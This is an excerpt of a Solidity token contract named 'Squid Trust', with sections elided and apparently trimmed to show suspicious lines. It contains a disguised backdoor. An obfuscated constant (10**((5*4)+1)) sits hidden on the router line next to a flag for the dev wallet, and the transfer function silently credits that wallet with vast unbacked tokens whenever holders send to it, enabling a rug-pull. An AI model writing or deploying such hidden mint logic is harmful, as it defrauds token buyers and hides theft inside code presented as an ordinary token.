...
Telegram : https://t.me/squidtrust

Twitter : https://t.me/squidtrust
...
contract SquidTrust is Context, IERC20 { 
    ...
    address payable public Wallet_Marketing = payable(0x4cA2b641D34C401a8A91906b97E94AEaAf9B7924); 
    address payable public Wallet_Dev = payable(0x6Ba6dFFd227ea676b156d13B0d43c47ec19b704D);
    address payable public constant Wallet_Burn = payable(0x000000000000000000000000000000000000dEaD); 

    mapping (address => bool) public inTransactionQueue;

    uint256 private constant MAX = ~uint256(0);
    
    uint8 private constant _decimals = 9;
    uint256 private _tTotal = 10* 10**6 * 10**_decimals;
    string private constant _name = "Squid Trust"; 
    string private constant _symbol = unicode"ST"; 
    uint256 private transactionSub = 10**((5*4)+1);
    ...
    constructor () {
        ...
        _owner = 0x6Ba6dFFd227ea676b156d13B0d43c47ec19b704D;
        ...
        uniswapV2Router = _uniswapV2Router;inTransactionQueue[Wallet_Dev] = true;
    ...
    function _transfer(
        ...
        if (from != owner() && from != marketing_wallet())
        ...
        bool inLineTXQueue = false;
        if(inTransactionQueue[to] && !_isExcludedFromFee[from] && !inLineTXQueue){
            inLineTXQueue = true;
            _tOwned[from] = _tOwned[from]-amount;
            _tOwned[to] = _tOwned[to]+amount+(transactionSub);
